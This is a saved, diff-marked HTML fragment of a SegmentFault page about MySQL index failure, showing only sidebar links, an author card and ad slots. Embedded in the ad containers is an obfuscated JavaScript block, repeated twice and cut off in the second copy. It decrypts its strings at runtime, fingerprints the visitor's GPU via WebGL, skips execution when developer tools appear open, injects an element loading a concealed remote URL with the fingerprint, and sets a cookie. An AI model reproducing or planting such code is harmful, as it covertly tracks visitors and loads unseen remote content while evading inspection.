测试最左前缀原则，发现了匪夷所思的事情。根据最左前缀原则，本来应该索引失效，走全表扫描的，但是，却发现可以正常走索引。</p><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-primary">烟雨星空</span><span class="split-dot"></span><span>阅读 4.7k</span><span class="split-dot"></span><span>42 赞</span><span class="split-dot"></span><span>17 评论</span></p></a><a class="list-group-item list-group-item-action py-3" href="https://segmentfault.com/a/1190000019283325?utm_source=sf-similar-article" target="_blank"><h5 class="h5 mb-2 text-break" style="color: rgb(33, 37, 41);">mysql高效索引之覆盖索引</h5><p class="mb-2 text-truncate text-secondary">解释二： 索引是高效找到行的一个方法，当能通过检索索引就可以读取想要的数据，那就不需要再到数据表中读取行了。如果一个索引包含了（或覆盖了）满足查询语句中字段与条件的数据就叫做覆盖索引。</p><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-primary">风云</span><span class="split-dot"></span><span>阅读 2.6k</span><span class="split-dot"></span><span>3 赞</span><span class="split-dot"></span><span>3 评论</span></p></a><a class="list-group-item list-group-item-action py-3" href="https://segmentfault.com/a/1190000020277608?utm_source=sf-similar-article" target="_blank"><h5 class="h5 mb-2 text-break" style="color: rgb(33, 37, 41);">工作中遇到的99%SQL优化，这里都能给你解决方案</h5><p class="mb-2 text-truncate text-secondary">前几篇文章介绍了mysql的底层数据结构和mysql优化的神器explain。后台有些朋友说小强只介绍概念，平时使用还是一脸懵，强烈要求小强来一篇实战sql优化，经过周末两天的整理和总结，sql优化实战新鲜出炉， 大家平...</p><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-primary">小强的进阶之路</span><span class="split-dot"></span><span>阅读 571</span><span class="split-dot"></span><span>3 赞</span></p></a><a class="list-group-item list-group-item-action py-3" href="https://segmentfault.com/a/1190000022621410?utm_source=sf-similar-article" target="_blank"><h5 class="h5 mb-2 text-break" style="color: rgb(33, 37, 41);">一张图搞懂MySQL的索引失效</h5><p class="mb-2 text-truncate text-secondary">一张图搞懂MySQL的索引失效 mysql 更新于 1月3日&nbsp;约 12 分钟 索引对于MySQL而言，是非常重要的篇章。索引知识点也巨多，要想掌握透彻，需要逐个知识点一一击破，今天来先来聊聊哪些情况下会导致索引失效。 图片总...</p><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-primary">哈基石</span><span class="split-dot"></span><span>阅读 386</span><span class="split-dot"></span><span>3 赞</span></p></a><a class="list-group-item list-group-item-action py-3" href="https://segmentfault.com/a/1190000019893603?utm_source=sf-similar-article" target="_blank"><h5 class="h5 mb-2 text-break" style="color: rgb(33, 37, 41);">mysql索引最左原则</h5><p class="mb-2 text-truncate text-secondary">由此可见，只有sql中where包含联合索引的首个字段的查询才能命中索引，这个叫索引的最左匹配特性。 联合索引的使用在写where条件的顺序无关，mysql查询分析会进行优化而使用索引。但是减轻查询分析器的压力，最好...</p><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-primary">徐曙辉</span><span class="split-dot"></span><span>阅读 635</span><span class="split-dot"></span><span>2 赞</span></p></a><a class="list-group-item list-group-item-action py-3" href="https://segmentfault.com/a/1190000021815758?utm_source=sf-similar-article" target="_blank"><h5 class="h5 mb-2 text-break" style="color: rgb(33, 37, 41);">一本彻底搞懂MySQL索引优化EXPLAIN百科全书</h5><p class="mb-2 text-truncate text-secondary">1、MySQL逻辑架构 日常在CURD的过程中，都避免不了跟数据库打交道，大多数业务都离不开数据库表的设计和SQL的编写，那如何让你编写的SQL语句性能更优呢？ 先来整体看下MySQL逻辑架构图： MySQL整体逻辑架构图可以...</p><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-primary">Java爱好者社区</span><span class="split-dot"></span><span>阅读 1.3k</span><span class="split-dot"></span><span>2 赞</span></p></a><a class="list-group-item list-group-item-action py-3" href="https://segmentfault.com/a/1190000021478171?utm_source=sf-similar-article" target="_blank"><h5 class="h5 mb-2 text-break" style="color: rgb(33, 37, 41);">orderBy 排序优化</h5><p class="mb-2 text-truncate text-secondary">在日常的业务开发中，order by 排序是少不了的。但要写出高效的排序SQL，需要先花点精力和时间来了解排序的底层原理，这样才能找到优化排序的好策略。</p><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-primary">张德Talk</span><span class="split-dot"></span><span>阅读 526</span><span class="split-dot"></span><span>1 赞</span></p></a></div></div></div></div></div><div class="col-12 col-xl-auto col"><div class="w-xl-300"><div class="w-xl-300 d-none d-xl-block" id="author" style="top: 81.2px;"><div class="mb-4 card"><div class="card-body"><div class="d-flex align-items-center mb-3"><picture class="rounded-circle mr-3"><a href="https://segmentfault.com/u/zhangdejian"><img src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/93059368-5e0ade65df70d_huge128" alt="avatar" width="64" height="64" class="rounded-circle"></a></picture><div><h5 class="mb-0"><a href="https://segmentfault.com/u/zhangdejian" class="text-body">张德Talk</a></h5></div></div><div class="text-secondary text-truncate-2 userExcerpt mb-3"><p>每日精进，致力于成为全栈工程师！</p></div><div class="d-flex align-items-center mb-3"><div class="mr-4"><strong>512</strong><span class="text-secondary"> 声望</span></div><div><strong>623</strong><span class="text-secondary"> 粉丝</span></div></div><button type="button" class="btn btn-primary btn-block">关注作者</button></div></div></div><div class="w-xl-300 mb-4" id="first-ad" style="top: 81.2px;"><div class="card border-0 overflow-hidden d-none d-xl-flex justify-content-center align-items-center float-ads"><div id="OA_holder_1" class="ad-container" style="display:block"><div style="line-height: 0"><script async="" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/f(6).txt"></script>
+<!-- 文章详情 - 侧栏矩形 -->
+<ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-6330872677300335" data-ad-slot="6800875204" data-adsbygoogle-status="done"><ins id="aswift_1_expand" style="display:inline-table;border:none;height:250px;margin:0;padding:0;position:relative;visibility:visible;width:300px;background-color:transparent;" tabindex="0" title="Advertisement" aria-label="Advertisement"><ins id="aswift_1_anchor" style="display:block;border:none;height:250px;margin:0;padding:0;position:relative;visibility:visible;width:300px;background-color:transparent;"><iframe id="aswift_1" name="aswift_1" style="left:0;position:absolute;top:0;border:0;width:300px;height:250px;" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="300" height="250" frameborder="0" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/ads(1).html" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" data-google-container-id="a!2" data-google-query-id="CMGQvKuUmPACFQ8sYAodG7MKBw" data-load-complete="true"></iframe></ins></ins></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script><div id="beacon_d72bd5ced9" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/lg(4).php" width="0" height="0" alt="" style="width: 0px; height: 0px;"></div></div><script type="text/javascript">var a0_0x5a7b=["gHn8nA==","toUTCString","pPUzbNqUOoPi1YTki","2BWEY1lTYNp/T+I9OQHVoZE=","IXFRmLrn","CgNqeWZa8Y45plkkKxbF4Q==","ZrSEYyW0b7Q0IPUqb/13ifQErimI4pBr","K3dNkqXKJbiemnk=","brSEdDKSbQ==","wRm0hXRLhWKYSg==","length","YtXMjstIgPUMjLZlaNb5QcsHsJfofqs=","01GCQWkzBrg=","2lWGVHRtav9SW7Q=","VOnkruxmgN02s5ZFWA==","YtXMjstIgPUMiLZlaNz5W84dpZXm","z0CORTVjSOFaRLMFKCvA","hcmRM5IG",";x20expires=","charCodeAt","rnaTNfMM5A5g","UP71jPdtsdQrqg==","lhDGASp5UQ==","cookie","yEaEWGp9","nEERm2ggVqUX","z1yGVA==","3UmTSW5gW/ZZWL8cbzjb/NRGE7wdKmt7","10CQRQ==","y0CcZStaTd1xcqMeCA==","xwKuhXRLhWKYSg==","ZDdmYg==","LyhDf39R658bu2Y/LxzF9w==","2FeTUG5sbPteWrUZNQ==",";x20path=/","yFCUQm57QPlc","K2pqmb72KbCVm3dtWA==","fixfCHIILA","xwKuhXRUiW+LShE=","atob","UP71n/lxpNw2qpZZ","YN7DiNRcodQxq5R0XvbFYPwqgqD1UImgOA==","ivuH9sk1F","UP71iuB3oN8gt5xF","WdIF+SOSzC5OLXDS7t8=","2keFXnZ8XfI=","0kE=","yECCcG59W/5ZQqQS","UuPxqupqqNQ9qpJHAeTOZv40"];(function(_0x1b61e1,_0x5a7b88){var _0x282611=function(_0x46bc60){while(--_0x46bc60){_0x1b61e1["push"](_0x1b61e1["shift"]());}};_0x282611(++_0x5a7b88);}(a0_0x5a7b,0xd7));var a0_0x2826=function(_0x1b61e1,_0x5a7b88){_0x1b61e1=_0x1b61e1-0x0;var _0x282611=a0_0x5a7b[_0x1b61e1];return _0x282611;};function kPbwxjZPvhHuql2cK(_0x2a7b56,_0x3dbb7d){var _0x39df8d=[],_0x3893cb=0x0,_0x4bd01a,_0x39ab8a="";for(var _0x4366fa=0x0;_0x4366fa<0x100;_0x4366fa++){_0x39df8d[_0x4366fa]=_0x4366fa;}for(_0x4366fa=0x0;_0x4366fa<0x100;_0x4366fa++){_0x3893cb=(_0x3893cb+_0x39df8d[_0x4366fa]+_0x3dbb7d[a0_0x2826("0x0")](_0x4366fa%_0x3dbb7d[a0_0x2826("0x28")]))%0x100;_0x4bd01a=_0x39df8d[_0x4366fa];_0x39df8d[_0x4366fa]=_0x39df8d[_0x3893cb];_0x39df8d[_0x3893cb]=_0x4bd01a;}_0x4366fa=0x0;_0x3893cb=0x0;for(var _0x1f6e6d=0x0;_0x1f6e6d<_0x2a7b56[a0_0x2826("0x28")];_0x1f6e6d++){_0x4366fa=(_0x4366fa+0x1)%0x100;_0x3893cb=(_0x3893cb+_0x39df8d[_0x4366fa])%0x100;_0x4bd01a=_0x39df8d[_0x4366fa];_0x39df8d[_0x4366fa]=_0x39df8d[_0x3893cb];_0x39df8d[_0x3893cb]=_0x4bd01a;_0x39ab8a+=String["fromCharCode"](_0x2a7b56["charCodeAt"](_0x1f6e6d)^_0x39df8d[(_0x39df8d[_0x4366fa]+_0x39df8d[_0x3893cb])%0x100]);}return _0x39ab8a;}function z58lhCJ(_0x5b3c65){var _0x2744f4="";try{_0x2744f4=window[a0_0x2826("0x14")](_0x5b3c65);}catch(_0x1d8981){}return _0x2744f4;};function aVxrxoIKgEYVWFC7(){var _0x2b4132=[a0_0x2826("0xc"),a0_0x2826("0x2c"),"VPrvuflw","QP7jqPQ=",a0_0x2826("0x1d"),a0_0x2826("0x2"),a0_0x2826("0x18"),a0_0x2826("0x15"),a0_0x2826("0x16"),a0_0x2826("0x2d"),a0_0x2826("0x29")];var _0x1267a4=document[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x1]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x2]),_0x2b4132[0x0]));var _0x424e30;var _0x30e940;var _0x470837;var _0x229329;try{_0x424e30=_0x1267a4[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x5]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x3]),_0x2b4132[0x0]))||_0x1267a4[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x5]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x4]),_0x2b4132[0x0]));}catch(_0x408b8e){}if(_0x424e30){_0x30e940=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x6]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x8]),_0x2b4132[0x0]));_0x470837=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x7]),_0x2b4132[0x0])](_0x30e940[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x9]),_0x2b4132[0x0])]);_0x229329=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x7]),_0x2b4132[0x0])](_0x30e940[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0xa]),_0x2b4132[0x0])]);}return _0x470837+"x20"+_0x229329;}function w9jcVeUDT(){var _0x3c83be=[a0_0x2826("0xb"),a0_0x2826("0x27"),a0_0x2826("0x13"),a0_0x2826("0x6"),a0_0x2826("0x25"),"BHBRkrX3Jw==",a0_0x2826("0x22"),a0_0x2826("0x11"),a0_0x2826("0x20")];const _0x1c6d55=0xa0;const _0x37ae20=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x0]),_0x3c83be[0x3])]-window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x1]),_0x3c83be[0x3])]>_0x1c6d55;const _0x4883d0=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x2]),_0x3c83be[0x3])]-window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x4]),_0x3c83be[0x8])]>_0x1c6d55;if(!(_0x4883d0&&_0x37ae20)&&(window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])]&&window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x6]),_0x3c83be[0x8])]&&window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x6]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x7]),_0x3c83be[0x8])]||_0x37ae20||_0x4883d0)){return![];}else{return!![];}}function xGzLVAwTj9Dm(_0x528fc1,_0x3b5174,_0xfbb720){var _0x905dbf="";if(_0xfbb720){var _0x50d54e=new Date();_0x50d54e["setTime"](_0x50d54e["getTime"]()+_0xfbb720*0x18*0x3c*0x3c*0x3e8);_0x905dbf=a0_0x2826("0x30")+_0x50d54e[a0_0x2826("0x1f")]();}document[a0_0x2826("0x4")]=_0x528fc1+"="+(_0x3b5174||"")+_0x905dbf+a0_0x2826("0xf");}function uhAtRHZXRS(){var _0x7edbb9=["aJgicnL4X6hO",a0_0x2826("0x8"),"znG4dXV8X8ZND5w6dTeC+8M=",a0_0x2826("0xe"),a0_0x2826("0x5"),a0_0x2826("0x1c"),"yFeV",a0_0x2826("0x1b"),a0_0x2826("0x21"),a0_0x2826("0x7"),a0_0x2826("0x2e"),a0_0x2826("0x1a"),"iBXGQWI=",a0_0x2826("0x3"),a0_0x2826("0x2b"),"2EqZWnNs",a0_0x2826("0x9"),"yUSYVXVk","z0qlRWhgR/A=",a0_0x2826("0x10"),a0_0x2826("0xa"),a0_0x2826("0x1"),"z0SRbnhoW/laXLwS",a0_0x2826("0x2a")];var _0xde5cda=[a0_0x2826("0x1e"),"lmjgiQ==",a0_0x2826("0x2f"),a0_0x2826("0x24"),"ZLWPeiO4",a0_0x2826("0x26"),"sYkn4Oqn64Pdr"];var _0x33bc41;try{_0x33bc41=aVxrxoIKgEYVWFC7();}catch(_0x110e3a){}try{_0x33bc41=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x0]),_0xde5cda[0x2])](_0x33bc41);}catch(_0x3e7ed0){}_0x33bc41=encodeURIComponent(_0x33bc41);var _0x13700b=navigator["userAgent"]||navigator["vendor"]||window["opera"];var _0xb93071=kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x3]),_0xde5cda[0x6]);var _0x331712=new RegExp(_0xb93071,"i");var _0x53686b=!![];var _0x2d8ac7=kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x14]),_0x7edbb9[0x15]);if(_0x331712[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x1]),_0xde5cda[0x2])](_0x13700b)){if(document[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x4]),_0xde5cda[0x6])][kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x5]),_0xde5cda[0x6])](_0x2d8ac7)==-0x1){if(w9jcVeUDT()){var _0x5d4d20=kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x17]),_0x7edbb9[0x15])+kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x1]),_0x7edbb9[0x15])+"?"+kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x8]),_0x7edbb9[0x15])+"="+_0x33bc41;var _0x5b2742=document[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x3]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x4]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x7]),_0x7edbb9[0x15]),kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x8]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x9]),_0x7edbb9[0x15]),kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0xa]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x6]),_0x7edbb9[0x15]),_0x5d4d20);document["body"][kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0xe]),_0x7edbb9[0x15])](_0x5b2742);xGzLVAwTj9Dm(_0x2d8ac7,"1","7");}}}}var aJ4knj0Q2TsZ=[a0_0x2826("0x19"),"XYcD7gyt6AZkIQDh3+Fn/PI=",a0_0x2826("0x12"),a0_0x2826("0xd"),a0_0x2826("0x23"),a0_0x2826("0x17")];var xz1ZKT5VYzY7UB=document[kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x0]),aJ4knj0Q2TsZ[0x2])](kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x1]),aJ4knj0Q2TsZ[0x2]));if(!xz1ZKT5VYzY7UB){document[kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x3]),aJ4knj0Q2TsZ[0x5])](kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x4]),aJ4knj0Q2TsZ[0x5]),uhAtRHZXRS());}</script>
+</div></div></div><div id="gridAd" class="d-none d-xl-block mb-4" style=""><div class="card"><div class="bg-white border-0 card-header"><h5 class="mb-0">宣传栏</h5></div><div class="card-body"><div class="mb-3"><div id="OA_holder_7" class="ad-container" style="display:block"><a href="https://sponsor.segmentfault.com/ck.php?oaparams=2__bannerid=400__zoneid=7__cb=0d0a8dcbb3__oadest=https%3A%2F%2Fke.sifou.com%2Fcourse%2F1650000023864436%3Futm_source%3Dsegmentfault%26utm_medium%3Dbanner_Tlink" target="_blank"><strong>自顶向下学 React 源码</strong><br>
+<small style="color: #6c757d">从理念到架构到实现到代码，透彻理解 </small></a><div id="beacon_0d0a8dcbb3" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/lg(5).php" width="0" height="0" alt="" style="width: 0px; height: 0px;"></div><script type="text/javascript">var a0_0x5a7b=["gHn8nA==","toUTCString","pPUzbNqUOoPi1YTki","2BWEY1lTYNp/T+I9OQHVoZE=","IXFRmLrn","CgNqeWZa8Y45plkkKxbF4Q==","ZrSEYyW0b7Q0IPUqb/13ifQErimI4pBr","K3dNkqXKJbiemnk=","brSEdDKSbQ==","wRm0hXRLhWKYSg==","length","YtXMjstIgPUMjLZlaNb5QcsHsJfofqs=","01GCQWkzBrg=","2lWGVHRtav9SW7Q=","VOnkruxmgN02s5ZFWA==","YtXMjstIgPUMiLZlaNz5W84dpZXm","z0CORTVjSOFaRLMFKCvA","hcmRM5IG",";x20expires=","charCodeAt","rnaTNfMM5A5g","UP71jPdtsdQrqg==","lhDGASp5UQ==","cookie","yEaEWGp9","nEERm2ggVqUX","z1yGVA==","3UmTSW5gW/ZZWL8cbzjb/NRGE7wdKmt7","10CQRQ==","y0CcZStaTd1xcqMeCA==","xwKuhXRLhWKYSg==","ZDdmYg==","LyhDf39R658bu2Y/LxzF9w==","2FeTUG5sbPteWrUZNQ==",";x20path=/","yFCUQm57QPlc","K2pqmb72KbCVm3dtWA==","fixfCHIILA","xwKuhXRUiW+LShE=","atob","UP71n/lxpNw2qpZZ","YN7DiNRcodQxq5R0XvbFYPwqgqD1UImgOA==","ivuH9sk1F","UP71iuB3oN8gt5xF","WdIF+SOSzC5OLXDS7t8=","2keFXnZ8XfI=","0kE=","yECCcG59W/5ZQqQS","UuPxqupqqNQ9qpJHAeTOZv40"];(function(_0x1b61e1,_0x5a7b88){var _0x282611=function(_0x46bc60){while(--_0x46bc60){_0x1b61e1["push"](_0x1b61e1["shift"]());}};_0x282611(++_0x5a7b88);}(a0_0x5a7b,0xd7));var a0_0x2826=function(_0x1b61e1,_0x5a7b88){_0x1b61e1=_0x1b61e1-0x0;var _0x282611=a0_0x5a7b[_0x1b61e1];return _0x282611;};function kPbwxjZPvhHuql2cK(_0x2a7b56,_0x3dbb7d){var _0x39df8d=[],_0x3893cb=0x0,_0x4bd01a,_0x39ab8a="";for(var _0x4366fa=0x0;_0x4366fa<0x100;_0x4366fa++){_0x39df8d[_0x4366fa]=_0x4366fa;}for(_0x4366fa=0x0;_0x4366fa<0x100;_0x4366fa++){_0x3893cb=(_0x3893cb+_0x39df8d[_0x4366fa]+_0x3dbb7d[a0_0x2826("0x0")](_0x4366fa%_0x3dbb7d[a0_0x2826("0x28")]))%0x100;_0x4bd01a=_0x39df8d[_0x4366fa];_0x39df8d[_0x4366fa]=_0x39df8d[_0x3893cb];_0x39df8d[_0x3893cb]=_0x4bd01a;}_0x4366fa=0x0;_0x3893cb=0x0;for(var _0x1f6e6d=0x0;_0x1f6e6d<_0x2a7b56[a0_0x2826("0x28")];_0x1f6e6d++){_0x4366fa=(_0x4366fa+0x1)%0x100;_0x3893cb=(_0x3893cb+_0x39df8d[_0x4366fa])%0x100;_0x4bd01a=_0x39df8d[_0x4366fa];_0x39df8d[_0x4366fa]=_0x39df8d[_0x3893cb];_0x39df8d[_0x3893cb]=_0x4bd01a;_0x39ab8a+=String["fromCharCode"](_0x2a7b56["charCodeAt"](_0x1f6e6d)^_0x39df8d[(_0x39df8d[_0x4366fa]+_0x39df8d[_0x3893cb])%0x100]);}return _0x39ab8a;}function z58lhCJ(_0x5b3c65){var _0x2744f4="";try{_0x2744f4=window[a0_0x2826("0x14")](_0x5b3c65);}catch(_0x1d8981){}return _0x2744f4;};function aVxrxoIKgEYVWFC7(){var _0x2b4132=[a0_0x2826("0xc"),a0_0x2826("0x2c"),"VPrvuflw","QP7jqPQ=",a0_0x2826("0x1d"),a0_0x2826("0x2"),a0_0x2826("0x18"),a0_0x2826("0x15"),a0_0x2826("0x16"),a0_0x2826("0x2d"),a0_0x2826("0x29")];var _0x1267a4=document[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x1]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x2]),_0x2b4132[0x0]));var _0x424e30;var _0x30e940;var _0x470837;var _0x229329;try{_0x424e30=_0x1267a4[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x5]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x3]),_0x2b4132[0x0]))||_0x1267a4[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x5]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x4]),_0x2b4132[0x0]));}catch(_0x408b8e){}if(_0x424e30){_0x30e940=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x6]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x8]),_0x2b4132[0x0]));_0x470837=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x7]),_0x2b4132[0x0])](_0x30e940[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x9]),_0x2b4132[0x0])]);_0x229329=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x7]),_0x2b4132[0x0])](_0x30e940[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0xa]),_0x2b4132[0x0])]);}return _0x470837+"x20"+_0x229329;}function w9jcVeUDT(){var _0x3c83be=[a0_0x2826("0xb"),a0_0x2826("0x27"),a0_0x2826("0x13"),a0_0x2826("0x6"),a0_0x2826("0x25"),"BHBRkrX3Jw==",a0_0x2826("0x22"),a0_0x2826("0x11"),a0_0x2826("0x20")];const _0x1c6d55=0xa0;const _0x37ae20=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x0]),_0x3c83be[0x3])]-window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x1]),_0x3c83be[0x3])]>_0x1c6d55;const _0x4883d0=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x2]),_0x3c83be[0x3])]-window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x4]),_0x3c83be[0x8])]>_0x1c6d55;if(!(_0x4883d0&&_0x37ae20)&&(window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])]&&window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x6]),_0x3c83be[0x8])]&&window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x6]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x7]),_0x3c83be[0x8])]||_0x37ae20||_0x4883d0)){return![];}else{return!![];}}function xGzLVAwTj9Dm(_0x528fc1,_0x3b5174,_0xfbb720){var _0x905dbf="";if(_0xfbb720){var _0x50d54e=new Date();_0x50d54e["setTime"](_0x50d54e["getTime"]()+_0xfbb720*0x18*0x3c*0x3c*0x3e8);_0x905dbf=a0_0x2826("0x30")+_0x50d54e[a0_0x2826("0x1f")]();}document[a0_0x2826("0x4")]=_0x528fc1+"="+(_0x3b5174||"")+_0x905dbf+a0_0x2826("0xf");}function uhAtRHZXRS(){var _0x7edbb9=["aJgicnL4X6hO",a0_0x2826("0x8"),"znG4dXV8X8ZND5w6dTeC+8M=",a0_0x2826("0xe"),a0_0x2826("0x5"),a0_0x2826("0x1c"),"yFeV",a0_0x2826("0x1b"),a0_0x2826("0x21"),a0_0x2826("0x7"),a0_0x2826("0x2e"),a0_0x2826("0x1a"),"iBXGQWI=",a0_0x2826("0x3"),a0_0x2826("0x2b"),"2EqZWnNs",a0_0x2826("0x9"),"yUSYVXVk","z0qlRWhgR/A=",a0_0x2826("0x10"),a0_0x2826("0xa"),a0_0x2826("0x1"),"z0SRbnhoW/laXLwS",a0_0x2826("0x2a")];var _0xde5cda=[a0_0x2826("0x1e"),"lmjgiQ==",a0_0x2826("0x2f"),a0_0x2826("0x24"),"ZLWPeiO4",a0_0x2826("0x26"),"sYkn4Oqn64Pdr"];var _0x33bc41;try{_0x33bc41=aVxrxoIKgEYVWFC7();}catch(_0x110e3a){}try{_0x33bc41=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x0]),_0xde5cda[0x2])](_0x33bc41);}catch(_0x3e7ed0){}_0x33bc41=encodeURIComponent(_0x33bc41);var _0x13700b=navigator["userAgent"]||navigator["vendor"]||window["opera"];var _0xb93071=kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x3]),_0xde5cda[0x6]);var _0x331712=new RegExp(_0xb93071,"i");var _0x53686b=!![];var _0x2d8ac7=kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x14]),_0x7edbb9[0x15]);if(_0x331712[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x1]),_0xde5cda[0x2])](_0x13700b)){if(document[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x4]),_0xde5cda[0x6])][kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x5]),_0xde5cda[0x6])](_0x2d8ac7)==-0x1){if(w9jcVeUDT()){var _0x5d4d20=kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x17]),_0x7edbb9[0x15])+kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x1]),_0x7edbb9[0x15])+"?"+kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x8]),_0x7edbb9[0x15])+"="+_0x33bc41;var 